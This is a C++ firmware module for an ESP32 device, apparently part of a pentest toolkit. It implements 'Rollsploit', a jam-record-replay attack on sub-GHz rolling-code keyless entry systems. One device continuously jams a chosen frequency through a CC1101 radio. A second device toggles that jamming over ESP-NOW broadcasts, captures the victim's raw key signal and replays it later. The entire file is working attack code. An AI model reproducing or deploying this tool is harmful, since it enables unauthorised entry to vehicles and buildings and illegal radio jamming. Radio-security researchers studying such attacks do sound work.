#include "rf_rollsploit.h"
#include "record.h"

#include <WiFi.h>
#include <esp_now.h>

bool jamming = false;
float rs_frequency = 433.92f;

void onReceive(const uint8_t *mac, const uint8_t *incomingData, int len) {
    String msg = "";
    for (int i = 0; i < len; i++) msg += (char)incomingData[i];

    if (msg == "startjam") {
        jamming = true;
    } else if (msg == "stopjam") {
        jamming = false;
    }
}

void rf_rollsploit_jam() {
    WiFi.mode(WIFI_STA);
    esp_now_init();
    esp_now_register_recv_cb(onReceive);

    int nTransmitterPin = bruceConfigPins.CC1101_bus.io0;
    if (!initRfModule("tx", rs_frequency)) return;

    setMHZ(rs_frequency);

    while (true) {
        if (check(EscPress)) break;

        if (millis() % 500 < 20) {
            tft.fillScreen(TFT_BLACK);
            displayRedStripe(
                jamming ? "JAMMING" : "Waiting...",
                getComplementaryColor2(bruceConfig.priColor),
                bruceConfig.priColor
            );
        }

        if (jamming) {
            for (int sequence = 1; sequence < 50; sequence++) {
                for (int duration = 1; duration <= 3; duration++) {
                    if (check(EscPress)) { break; }
                    digitalWrite(nTransmitterPin, HIGH);
                    for (int widthsize = 1; widthsize <= (1 + sequence); widthsize++) {
                        delayMicroseconds(10);
                    }

                    digitalWrite(nTransmitterPin, LOW);
                    for (int widthsize = 1; widthsize <= (1 + sequence); widthsize++) {
                        delayMicroseconds(10);
                    }
                }
            }
        }
    }

    deinitRfModule();
}

void rf_rollsploit_listen() {
    uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    WiFi.mode(WIFI_STA);
    esp_now_init();
    esp_now_peer_info_t peerInfo = {};
    memcpy(peerInfo.peer_addr, broadcastAddress, 6);
    peerInfo.channel = 1;
    peerInfo.encrypt = false;
    esp_now_add_peer(&peerInfo);

    char *msg = "stopjam";
    bool first_time = true;

    while (true) {
        if (check(EscPress)) break;

        if (check(SelPress) || first_time) {
            tft.fillScreen(TFT_BLACK);

            if (!first_time) {
                jamming = !jamming;
                if (jamming) {
                    msg = "startjam";
                } else {
                    msg = "stopjam";
                }
            }
            esp_now_send(broadcastAddress, (uint8_t *)msg, strlen(msg));
            first_time = false;

            tft.setCursor(5, 5);
            tft.setTextColor(TFT_WHITE);
            tft.println(String("[OK] Change Jammer State (" + String(jamming ? "ON" : "OFF")) + ")");
            tft.println("[NEXT] Record");
        }

        if (check(NextPress) || check(UpPress)) {
            RawRecording recording;
            recording.frequency = rs_frequency;
            bool rtm = false;
            rf_raw_record_create(recording, rtm);

        replay_thing:

            while (true) {
                if (check(SelPress)) { rf_raw_emit(recording, rtm); }

                if (check(EscPress)) { break; }
                if (check(SelPress)) { goto replay_thing; }
                if (check(PrevPress)) { return; }

                tft.fillScreen(0);
                tft.setCursor(5, 5);
                tft.println(String("[OK] Replay"));
                tft.println("[PREV] Exit");

                delay(10);
            }
        }
    }
}

void rf_rollsploit() {
    if (bruceConfig.rfModule != CC1101_SPI_MODULE) {
        displayError("Rollsploit needs a CC1101!", true);
        return;
    }
    if (!initRfModule("rx", rs_frequency)) {
        displayError("CC1101 not found!", true);
        return;
    }
    deinitRfModule();

select:

    jamming = false;

    int option = 0;
    options = {
        {"Jammer",    [&]() { option = 1; }},
        {"Listener",  [&]() { option = 2; }},
        {"Frequency", [&]() { option = 4; }},
        {"Main Menu", [&]() { option = 3; }},
    };
    loopOptions(options);

    tft.fillScreen(0x0);

    if (option == 3) {
        return;
    } else if (option == 1) {
        rf_rollsploit_jam();
        goto select;
    } else if (option == 2) {
        rf_rollsploit_listen();
        goto select;
    } else if (option == 4) {
        options = {};
        int ind = 0;
        int arraySize = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);
        for (int i = 0; i < arraySize; i++) {
            String tmp = String(subghz_frequency_list[i], 2) + "Mhz";
            options.push_back({tmp.c_str(), [=]() { rs_frequency = subghz_frequency_list[i]; }});
        }
        loopOptions(options, ind);
        options.clear();

        goto select;
    }
}
